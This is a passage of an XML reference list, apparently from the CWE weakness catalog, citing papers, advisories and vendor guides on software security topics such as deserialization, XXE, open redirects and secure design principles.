			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>http://marc.info/?l=bugtraq&amp;m=109525864717484&amp;w=2</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-432">
			<ns0:Author>Norm Hardy</ns0:Author>
			<ns0:Title>The Confused Deputy (or why capabilities might have been invented)</ns0:Title>
			<ns0:Publication_Year>1988</ns0:Publication_Year>
			<ns0:URL>http://www.cap-lore.com/CapTheory/ConfusedDeputy.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-433">
			<ns0:Author>Chaim Linhart</ns0:Author>
			<ns0:Author>Amit Klein</ns0:Author>
			<ns0:Author>Ronen Heled</ns0:Author>
			<ns0:Author>Steve Orrin</ns0:Author>
			<ns0:Title>HTTP Request Smuggling</ns0:Title>
			<ns0:URL>https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-434">
			<ns0:Author>David Wheeler</ns0:Author>
			<ns0:Title>Secure Programming for Linux and Unix HOWTO</ns0:Title>
			<ns0:Publication_Year>2003</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/semantic-attacks.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-436">
			<ns0:Author>mercy</ns0:Author>
			<ns0:Title>Exploiting Uninitialized Data</ns0:Title>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:URL>http://www.felinemenace.org/~mercy/papers/UBehavior/UBehavior.zip</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-437">
			<ns0:Author>Microsoft Security Vulnerability Research &amp; Defense</ns0:Author>
			<ns0:Title>MS08-014 : The Case of the Uninitialized Stack Variable Vulnerability</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://msrc.microsoft.com/blog/2008/03/ms08-014-the-case-of-the-uninitialized-stack-variable-vulnerability/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-442">
			<ns0:Author>Robert Seacord</ns0:Author>
			<ns0:Title>EXP01-A. Do not take the sizeof a pointer to determine the size of a type</ns0:Title>
			<ns0:URL>https://www.securecoding.cert.org/confluence/display/seccode/EXP01-A.+Do+not+take+the+sizeof+a+pointer+to+determine+the+size+of+a+type</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-453">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>OWASP , Attack Category : Mobile code: object hijack</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/Mobile_code:_object_hijack</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-454">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Introduction to Code Signing</ns0:Title>
			<ns0:URL>http://msdn.microsoft.com/en-us/library/ms537361(VS.85).aspx</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-455">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Authenticode</ns0:Title>
			<ns0:URL>http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-456">
			<ns0:Author>Apple</ns0:Author>
			<ns0:Title>Code Signing Guide</ns0:Title>
			<ns0:Publication>Apple Developer Connection</ns0:Publication>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20080724215143/http://developer.apple.com/documentation/Security/Conceptual/CodeSigningGuide/Introduction/chapter_1_section_1.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-457">
			<ns0:Author>Anthony Bellissimo</ns0:Author>
			<ns0:Author>John Burgess</ns0:Author>
			<ns0:Author>Kevin Fu</ns0:Author>
			<ns0:Title>Secure Software Updates: Disappointments and New Challenges</ns0:Title>
			<ns0:URL>http://prisms.cs.umass.edu/~kevinfu/papers/secureupdates-hotsec06.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-459">
			<ns0:Author>Johannes Ullrich</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 20 - Download of Code Without Integrity Check</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>https://www.sans.org/blog/top-25-series-rank-20-download-of-code-without-integrity-check/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-461">
			<ns0:Author>Matthias Kaiser</ns0:Author>
			<ns0:Title>Exploiting Deserialization Vulnerabilities in Java</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-462">
			<ns0:Author>Sam Thomas</ns0:Author>
			<ns0:Title>PHP unserialization vulnerabilities: What are we missing?</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:URL>https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-463">
			<ns0:Author>Gabriel Lawrence</ns0:Author>
			<ns0:Author>Chris Frohoff</ns0:Author>
			<ns0:Title>Marshalling Pickles: How deserializing objects can ruin your day</ns0:Title>
			<ns0:Publication_Year>2015</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:URL>https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-464">
			<ns0:Author>Heine Deelstra</ns0:Author>
			<ns0:Title>Unserializing user-supplied data, a bad idea</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:URL>https://drupalsun.com/heine/2010/08/25/unserializing-user-supplied-data-bad-idea</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-465">
			<ns0:Author>Manish S. Saindane</ns0:Author>
			<ns0:Title>Black Hat EU 2010 - Attacking Java Serialized Communication</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://www.slideshare.net/msaindane/black-hat-eu-2010-attacking-java-serialized-communication</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-466">
			<ns0:Author>Nadia Alramli</ns0:Author>
			<ns0:Title>Why Python Pickle is Insecure</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---09</ns0:Publication_Day>
			<ns0:URL>http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-467">
			<ns0:Author>Nelson Elhage</ns0:Author>
			<ns0:Title>Exploiting misuse of Python's "pickle"</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://blog.nelhage.com/2011/03/exploiting-pickle/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-468">
			<ns0:Author>Chris Frohoff</ns0:Author>
			<ns0:Title>Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---21</ns0:Publication_Day>
			<ns0:URL>https://speakerdeck.com/frohoff/owasp-sd-deserialize-my-shorts-or-how-i-learned-to-start-worrying-and-hate-java-object-deserialization</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-474">
			<ns0:Author>Douglas C. Schmidt</ns0:Author>
			<ns0:Author>Timothy H. Harrison</ns0:Author>
			<ns0:Author>Nat Pryce</ns0:Author>
			<ns0:Title>Thread-Specifc Storage for C/C++</ns0:Title>
			<ns0:URL>http://www.cs.wustl.edu/~schmidt/PDF/TSS-pattern.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-478">
			<ns0:Title>Intrinsic Locks and Synchronization (in Java)</ns0:Title>
			<ns0:URL>https://docs.oracle.com/javase/tutorial/essential/concurrency/locksync.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-480">
			<ns0:Title>Valgrind</ns0:Title>
			<ns0:URL>http://valgrind.org/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-482">
			<ns0:Author>Zvi Gutterman</ns0:Author>
			<ns0:Title>Hold Your Sessions: An Attack on Java Session-id Generation</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/gm05.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-483">
			<ns0:Author>Craig A. Shue</ns0:Author>
			<ns0:Author>Andrew J. Kalafut</ns0:Author>
			<ns0:Author>Minaxi Gupta</ns0:Author>
			<ns0:Title>Exploitable Redirects on the Web: Identification, Prevalence, and Defense</ns0:Title>
			<ns0:URL>https://www.cprogramming.com/tutorial/exceptions.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-484">
			<ns0:Author>Russ McRee</ns0:Author>
			<ns0:Title>Open redirect vulnerabilities: definition and prevention</ns0:Title>
			<ns0:Edition>Issue 17</ns0:Edition>
			<ns0:Publication>(IN)SECURE</ns0:Publication>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:URL>http://www.net-security.org/dl/insecure/INSECURE-Mag-17.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-485">
			<ns0:Author>Jason Lam</ns0:Author>
			<ns0:Title>Top 25 Series - Rank 23 - Open Redirect</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---25</ns0:Publication_Day>
			<ns0:Publisher>SANS Software Security Institute</ns0:Publisher>
			<ns0:URL>http://software-security.sans.org/blog/2010/03/25/top-25-series-rank-23-open-redirect</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-490">
			<ns0:Author>David Bacon et al</ns0:Author>
			<ns0:Title>The "Double-Checked Locking is Broken" Declaration</ns0:Title>
			<ns0:URL>http://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-491">
			<ns0:Author>Jeremy Manson and Brian Goetz</ns0:Author>
			<ns0:Title>JSR 133 (Java Memory Model) FAQ</ns0:Title>
			<ns0:URL>http://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#dcl</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-493">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>Second-Order Symlink Vulnerabilities</ns0:Title>
			<ns0:Publication>Bugtraq</ns0:Publication>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--06</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/bugtraq/2005/Jun/44</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-494">
			<ns0:Author>Shaun Colley</ns0:Author>
			<ns0:Title>Crafting Symlinks for Fun and Profit</ns0:Title>
			<ns0:Publication>Infosec Writers Text Library</ns0:Publication>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:URL>http://www.infosecwriters.com/texts.php?op=display&amp;id=159</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-496">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>XML External Entity (XXE) Processing</ns0:Title>
			<ns0:URL>https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-497">
			<ns0:Author>Sascha Herzog</ns0:Author>
			<ns0:Title>XML External Entity Attacks (XXE)</ns0:Title>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---20</ns0:Publication_Day>
			<ns0:URL>https://owasp.org/www-pdf-archive/XML_Exteral_Entity_Attack.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-498">
			<ns0:Author>Gregory Steuck</ns0:Author>
			<ns0:Title>XXE (Xml eXternal Entity) Attack</ns0:Title>
			<ns0:URL>https://www.beyondsecurity.com/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-499">
			<ns0:Author>WASC</ns0:Author>
			<ns0:Title>XML External Entities (XXE) Attack</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-500">
			<ns0:Author>Bryan Sullivan</ns0:Author>
			<ns0:Title>XML Denial of Service Attacks and Defenses</ns0:Title>
			<ns0:Publication_Year>2009</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:URL>https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-501">
			<ns0:Author>Chris Cornutt</ns0:Author>
			<ns0:Title>Preventing XXE in PHP</ns0:Title>
			<ns0:URL>https://websec.io/2012/08/27/Preventing-XXE-in-PHP.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-502">
			<ns0:Author>Shaun Clowes</ns0:Author>
			<ns0:Title>A Study in Scarlet - section 5, "File Upload"</ns0:Title>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-503">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Developing Secure ActiveX Controls</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-505">
			<ns0:Author>David Litchfield</ns0:Author>
			<ns0:Title>The Oracle Hacker's Handbook</ns0:Title>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-506">
			<ns0:Author>David Litchfield</ns0:Author>
			<ns0:Title>Cursor Injection</ns0:Title>
			<ns0:URL>http://www.davidlitchfield.com/cursor-injection.pdf</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-510">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>How to stop an ActiveX control from running in Internet Explorer</ns0:Title>
			<ns0:URL>https://support.microsoft.com/en-us/help/240797/how-to-stop-an-activex-control-from-running-in-internet-explorer</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-514">
			<ns0:Author>Rain Forest Puppy</ns0:Author>
			<ns0:Title>Poison NULL byte</ns0:Title>
			<ns0:Publication>Phrack 55</ns0:Publication>
			<ns0:URL>https://insecure.org/news/P55-07.txt</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-515">
			<ns0:Author>Brett Moore</ns0:Author>
			<ns0:Title>0x00 vs ASP file upload scripts</ns0:Title>
			<ns0:URL>http://www.security-assessment.com/Whitepapers/0x00_vs_ASP_File_Uploads.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-516">
			<ns0:Author>ShAnKaR</ns0:Author>
			<ns0:Title>ShAnKaR: multiple PHP application poison NULL byte vulnerability</ns0:Title>
			<ns0:URL>https://seclists.org/fulldisclosure/2006/Sep/185</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-517">
			<ns0:Author>Steve Christey</ns0:Author>
			<ns0:Title>Dynamic Evaluation Vulnerabilities in PHP applications</ns0:Title>
			<ns0:Publication>Full-Disclosure</ns0:Publication>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/fulldisclosure/2006/May/35</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-518">
			<ns0:Author>Shaun Clowes</ns0:Author>
			<ns0:Title>A Study In Scarlet: Exploiting Common Vulnerabilities in PHP Applications</ns0:Title>
			<ns0:URL>https://securereality.com.au/study-in-scarlett/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-522">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Failing Securely</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20221017053210/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/failing-securely</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-524">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Economy of Mechanism</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---13</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20220126060058/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/economy-of-mechanism</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-526">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Complete Mediation</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20221006191503/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/complete-mediation</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-528">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Top 10 2007-Insecure Direct Object Reference</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:URL>http://www.owasp.org/index.php/Top_10_2007-A4</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-529">
			<ns0:Title>HMAC</ns0:Title>
			<ns0:Publication_Year>2011</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:Publisher>Wikipedia</ns0:Publisher>
			<ns0:URL>https://en.wikipedia.org/wiki/HMAC</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-531">
			<ns0:Author>Web Application Security Consortium</ns0:Author>
			<ns0:Title>XPath Injection</ns0:Title>
			<ns0:URL>http://projects.webappsec.org/w/page/13247005/XPath%20Injection</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-535">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Separation of Privilege</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20220126060047/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/separation-of-privilege</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-539">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Psychological Acceptability</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20221104163022/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/psychological-acceptability</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-540">
			<ns0:Author>J. D. Tygar</ns0:Author>
			<ns0:Author>Alma Whitten</ns0:Author>
			<ns0:Title>Usability of Security: A Case Study</ns0:Title>
			<ns0:Publication>SCS Technical Report Collection, CMU-CS-98-155</ns0:Publication>
			<ns0:Publication_Year>1998</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---15</ns0:Publication_Day>
			<ns0:URL>http://reports-archive.adm.cs.cmu.edu/anon/1998/CMU-CS-98-155.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-542">
			<ns0:Author>Jon Postel, Editor</ns0:Author>
			<ns0:Title>RFC: 793, TRANSMISSION CONTROL PROTOCOL</ns0:Title>
			<ns0:Publication_Year>1981</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publisher>Information Sciences Institute</ns0:Publisher>
			<ns0:URL>https://www.ietf.org/rfc/rfc0793.txt</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-544">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Never Assuming that Your Secrets Are Safe</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---14</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20220126060054/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/never-assuming-that-your-secrets-are-safe</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-546">
			<ns0:Author>Sean Barnum</ns0:Author>
			<ns0:Author>Michael Gegick</ns0:Author>
			<ns0:Title>Design Principles</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20220126060046/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/design-principles</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-547">
			<ns0:Author>SUN</ns0:Author>
			<ns0:Title>Java Concurrency API</ns0:Title>
			<ns0:URL>https://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/locks/ReentrantLock.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-548">
			<ns0:Author>Dipak Jha, Software Engineer, IBM</ns0:Author>
			<ns0:Title>Use reentrant functions for safer signal handling</ns0:Title>
			<ns0:URL>https://archive.ph/rl1XR</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-554">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>Security Development Lifecycle (SDL) Banned Function Calls</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/bb288454(v=msdn.10)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-562">
			<ns0:Author>Don Parker</ns0:Author>
			<ns0:Title>Windows NTFS Alternate Data Streams</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---16</ns0:Publication_Day>
			<ns0:URL>https://seclists.org/basics/2005/Feb/312</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-565">
			<ns0:Author>Adam Doup&#233;</ns0:Author>		  
			<ns0:Author>Bryce Boe</ns0:Author>
			<ns0:Author>Christopher Kruegel</ns0:Author>
			<ns0:Author>Giovanni Vigna</ns0:Author>
			<ns0:Title>Fear the EAR: Discovering and Mitigating Execution After Redirect Vulnerabilities</ns0:Title>
			<ns0:URL>http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-567">
			<ns0:Author>Taimur Aslam</ns0:Author>
			<ns0:Title>A Taxonomy of Security Faults in the UNIX Operating System</ns0:Title>
			<ns0:Publication_Year>1995</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
			<ns0:URL>http://ftp.cerias.purdue.edu/pub/papers/taimur-aslam/aslam-taxonomy-msthesis.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-568">
			<ns0:Author>Taimur Aslam</ns0:Author>
			<ns0:Author>Ivan Krsul</ns0:Author>
			<ns0:Author>Eugene H. Spafford</ns0:Author>
			<ns0:Title>Use of A Taxonomy of Security Faults</ns0:Title>
			<ns0:Publication_Year>1995</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---01</ns0:Publication_Day>
